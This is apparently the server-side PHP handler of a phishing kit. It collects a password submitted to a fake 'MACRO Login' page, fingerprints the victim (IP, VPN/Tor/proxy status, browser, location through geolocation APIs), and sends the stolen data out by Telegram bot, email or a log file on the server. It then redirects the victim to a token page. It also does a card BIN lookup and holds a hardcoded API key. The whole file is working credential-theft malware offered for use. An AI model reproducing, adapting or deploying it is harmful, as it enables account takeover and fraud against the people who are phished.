<?php
error_reporting(0);
include("configure.php");
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function telegram($msg) {
        global $token,$chat_id;
        $url='https://api.telegram.org/bot'.$token.'/sendMessage';$data=array('chat_id'=>$chat_id,'text'=>$msg);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
        return $result;
}
function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'Linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'Mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    }
    elseif (preg_match('/windows|win64/i', $u_agent)) {
        $platform = 'Windows';
    }
   
    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
        $bname = 'Apple Safari';
        $ub = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Opera';
        $ub = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent))
    {
        $bname = 'Netscape';
        $ub = "Netscape";
    }
    elseif(preg_match('/Brave/i',$u_agent))
    {
        $bname = 'Brave';
        $ub = "Brave";
    }
    elseif(preg_match('/MicrosoftEdge/i',$u_agent))
    {
        $bname = 'Microsoft Edge';
        $ub = "Microsoft Edge";
    }
   
    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }
   
    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
   
    // check if we have a number
    if ($version==null || $version=="") {$version="?";}
   
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
}
  $six = $_POST['number'];
  // Insert CURL
  function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
  // Enam digit Formula
  function defineNUM($bin) {
      return str_replace(' ', '', stripslashes($_POST["number"]));
	  return substr($bin,0,6);
  }
  // JSON DATA
    $bin = defineNUM($six);
    $curl = curl("https://lookup.binlist.net/".$bin); // Thanks to this API!
    $json = json_decode($curl);
    $brand = $json->scheme ? $json->scheme : "error";
    $cardType = $json->type ? $json->type : "error";
    $cardCategory = $json->bank ? $json->bank : "error";
    $countryName = $json->country ? $json->country : "error";
    $countryCode = $json->country ? $json->country : "error";
    if ($six == null) {

}

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);

function systemInfo($ipAddress) {
    $systemInfo = array();

    $ipDetails = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ipAddress), true);
    $systemInfo['city'] = $ipDetails['geoplugin_city'];
    $systemInfo['region'] = $ipDetails['geoplugin_region'];
    $systemInfo['country'] = $ipDetails['geoplugin_countryName'];
    return $systemInfo;
}
$Location = "".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country']."";

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT']; 
$session_id = generateRandomString(80);

$ua=getBrowser();

$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$IP_ADDRESS = $_SERVER['REMOTE_ADDR']; # Automatically get IP Address

// Input VPNAPI.IO API Key
// Create an account to get a free API Key
// Free API keys has a limit of 1000/requests per a day
$API_KEY = "ad94c437064d4fb9a0eb30f7262d34ae";

// API URL
$API_URL = 'https://vpnapi.io/api/' . $IP_ADDRESS . '?key=' . $API_KEY;

// Fetch VPNAPI.IO API 
$response = file_get_contents($API_URL);

// Decode JSON response
$response = json_decode($response);




// Check if IP Address is VPN
if($response->security->vpn) {
	// Add code here for any IP Address that is a VPN
	$vpn .= "VPN ✅ ";
} else {
	// Add code here for any IP Address that is not a VPN
	$vpn .= "VPN ❌";
}

// Check if IP Address is Proxy
if($response->security->proxy) {
	// Add code here for any IP Address that is a proxy
	$proxy .= "PROXY ✅ ";
} else {
	// Add code here for any IP Address that is not a proxy
	$proxy .= "PROXY ❌ ";
}

// Check if IP Address is TOR Exit Node
if($response->security->tor) {
	// Add code here for any IP Address that is a TOR Node
	$tor .= "TOR ✅ ";
} else {
	// Add code here for any IP Address that is not a TOR Node
	$tor .= "TOR ❌ ";
}

$pass = $_POST['password'];

$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$message .= "[+]━━━━━━━━[\/]━━━━━━━━━[+]\n";
$message .= "| 🔓 MACRO Login 🔓\n";
$message .= "| 【Password】 $pass\n";
$message .= "[+]━━━━━━━━[/\]━━━━━━━━━[+]\n";
$message .= " \n🫂 Victim Information 🔍 \n";
$message .= " \n🗺️ User IP: ".$ip."\n";
$message .= " \n 🌎 ".$vpn."\n";
$message .= " 🌎 ".$tor."\n";
$message .= " 🌎 ".$proxy."\n";
$message .= " \n 📅 Date: ".$adddate." \n";
$message .= " 🌐 ORG: $details->org\n";
$message .= " 🌐 Browser: " . $ua['name'] . " " . $ua['version'] . " \n";
$message .= " 🌐 Operating System:  " .$ua['platform'] . "  \n\n";
$message .= " \n📍 Where Is?: $details->country , $details->region , $details->city \n";
$message .= " \n📍 Location: https://www.google.com/maps/place/$details->loc \n\n";
$message .= " 🌐 User-Agent: ".$useragent."\n";
$message .= "[+]━━【By unkn0wnaccoun7🖕🤡🖕】━━[+]  \n\n";


if($Send_to_Telegram==1) {
telegram ("$message");
}


$subject="LOGIN | $ip ";
$from= "From: MACRO";


if($Save_on_Server==1) {
$file=fopen("../RZ/rz.txt","a");
fwrite($file,$message);
fclose($file);
}

if($Send_to_Email==1) {
mail($youremail, "$subject", $message, $from);
}


header("Location: ../token.html");



?>